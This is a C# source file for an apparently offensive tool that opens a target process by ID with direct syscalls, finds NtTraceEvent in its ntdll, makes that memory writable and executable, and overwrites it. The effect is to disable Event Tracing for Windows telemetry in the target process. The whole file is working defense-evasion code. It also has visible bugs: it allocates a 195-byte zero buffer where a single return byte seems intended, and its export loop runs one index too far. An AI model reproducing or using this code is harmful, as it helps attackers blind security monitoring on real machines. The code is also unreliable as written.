using System;
using System.Runtime.InteropServices;

namespace etwsyscall
{
    class Program
    {
        private static IntPtr GetNtdllAddress(IntPtr hProcess, IntPtr PebAddress)
        {
            IntPtr Buffer = Memory.AllocateMemory(
                new IntPtr(-1),
                new IntPtr(Marshal.SizeOf(typeof(Win32.PEB)))
            );

            Buffer = Memory.ReadMemory(
                hProcess,
                PebAddress,
                Buffer,
                Marshal.SizeOf(typeof(Win32.PEB))
            );

            var pebStructure = Marshal.PtrToStructure<Win32.PEB>(Buffer);
            var pebLdrStructure = Marshal.PtrToStructure<Win32.PEB_LDR_DATA>(pebStructure.Ldr);

            var ldrDataStructure = Marshal.PtrToStructure<Win32.LDR_DATA_TABLE_ENTRY>(pebLdrStructure.InLoadOrderModuleList.Flink);
            ldrDataStructure = Marshal.PtrToStructure<Win32.LDR_DATA_TABLE_ENTRY>(ldrDataStructure.InLoadOrderLinks.Flink);

            if (ldrDataStructure.FullDllName.ToString().Contains("ntdll"))
            {
                return ldrDataStructure.DllBase;
            }

            return IntPtr.Zero;
        }

        private static IntPtr GetFunctionAddress(IntPtr BaseAddress)
        {
            var imageStructure = Marshal.PtrToStructure<Win32.IMAGE_DOS_HEADER>(BaseAddress);
            var ntdllNtHeader = IntPtr.Add(BaseAddress, imageStructure.e_lfanew);
            var ntHeaderStructure = Marshal.PtrToStructure<Win32.IMAGE_NT_HEADERS64>(ntdllNtHeader);

            IntPtr BaseAddressVA = IntPtr.Add(BaseAddress, Convert.ToInt32(ntHeaderStructure.OptionalHeader.DataDirectory[0].VirtualAddress));

            var imageExportStructure = Marshal.PtrToStructure<Win32.IMAGE_EXPORT_DIRECTORY>(BaseAddressVA);
            IntPtr functionAddressName = IntPtr.Add(BaseAddress, Convert.ToInt32(imageExportStructure.Name));

            IntPtr aof = IntPtr.Add(BaseAddress, Convert.ToInt32(imageExportStructure.AddressOfFunctions));
            IntPtr aon = IntPtr.Add(BaseAddress, Convert.ToInt32(imageExportStructure.AddressOfNames));
            IntPtr aono = IntPtr.Add(BaseAddress, Convert.ToInt32(imageExportStructure.AddressOfNameOrdinals));

            for (int i = 0; i <= imageExportStructure.NumberOfNames; i++)
            {
                int nameRva = Marshal.ReadInt32(IntPtr.Add(aon, (int)(i * 4)));
                string name = Marshal.PtrToStringAnsi(IntPtr.Add(BaseAddress, nameRva));

                ushort hint = (ushort)Marshal.ReadInt16(IntPtr.Add(aono, (int)(i * 2)));

                int funcRva = Marshal.ReadInt32(IntPtr.Add(aof, hint * 4));
                IntPtr funcVA = IntPtr.Add(BaseAddress, funcRva);

                if (name.Contains("NtTraceEvent")) return funcVA;
            }

            return IntPtr.Zero;
        }

        static void Main(string[] args)
        {
            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.CLIENT_ID ci = new Win32.CLIENT_ID(); ci.UniqueProcess = (IntPtr)Convert.ToInt32(args[0]);

            var handleStatus = Syscalls.NtOpenProcess(
                out IntPtr hProcess,
                Win32.PROCESS_ACCESS_RIGHTS.PROCESS_QUERY_LIMITED_INFORMATION |
                Win32.PROCESS_ACCESS_RIGHTS.PROCESS_VM_READ |
                Win32.PROCESS_ACCESS_RIGHTS.PROCESS_VM_WRITE |
                Win32.PROCESS_ACCESS_RIGHTS.PROCESS_VM_OPERATION,
                oa,
                ci
            );

            if (handleStatus != Win32.NTSTATUS.Success)
                throw new Exception($"NtOpenProcess FAILED! Status: {handleStatus}");

            int ReturnLength = 0;

            var queryStatus = Syscalls.NtQueryInformationProcess(
                hProcess,
                Win32.PROCESSINFOCLASS.ProcessBasicInformation,
                out Win32.PROCESS_BASIC_INFORMATION pbi,
                Marshal.SizeOf(typeof(Win32.PROCESS_BASIC_INFORMATION)),
                ref ReturnLength
            );

            if (queryStatus != Win32.NTSTATUS.Success || pbi.PebBaseAddress == IntPtr.Zero)
                throw new Exception($"NtQueryInformationProcess FAILED! Status: {queryStatus}");

            IntPtr ntdllAddress = GetNtdllAddress(hProcess, pbi.PebBaseAddress);
            IntPtr NtTraceAddress = GetFunctionAddress(ntdllAddress);

            long NtTraceOffset = Convert.ToInt64(NtTraceAddress) - Convert.ToInt64(ntdllAddress);

            Console.WriteLine($"[^] Process PEB ADDRESS: {pbi.PebBaseAddress}");
            Console.WriteLine($"[^] Process NTDLL ADDRESS: {ntdllAddress.ToString("X")}");
            Console.WriteLine($"[^] Process NtTraceEvent ADDRESS: {NtTraceAddress.ToString("X")}, OFFSET: {NtTraceOffset.ToString("X")}");

            byte[] ret = new byte[0XC3];
            IntPtr NtTraceVA = new IntPtr(ntdllAddress.ToInt64() + NtTraceOffset);

            //Console.WriteLine("Press any key to continue...");
            //Console.ReadKey();

            var oldProtect = Memory.ProtectMemory(
                hProcess,
                NtTraceVA,
                new IntPtr(ret.Length),
                Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE
            );

            Console.WriteLine($"[^] Changed {oldProtect} to PAGE_EXECUTE_READWRITE!");

            Memory.WriteMemory(
                hProcess,
                NtTraceVA,
                ret,
                ret.Length
            );

            Memory.ProtectMemory(
                hProcess,
                NtTraceVA,
                new IntPtr(ret.Length),
                oldProtect
            );

            Console.WriteLine("[^] Enjoy!");

            //Console.WriteLine("Press any key to continue...");
            //Console.ReadKey();
        }
    }
}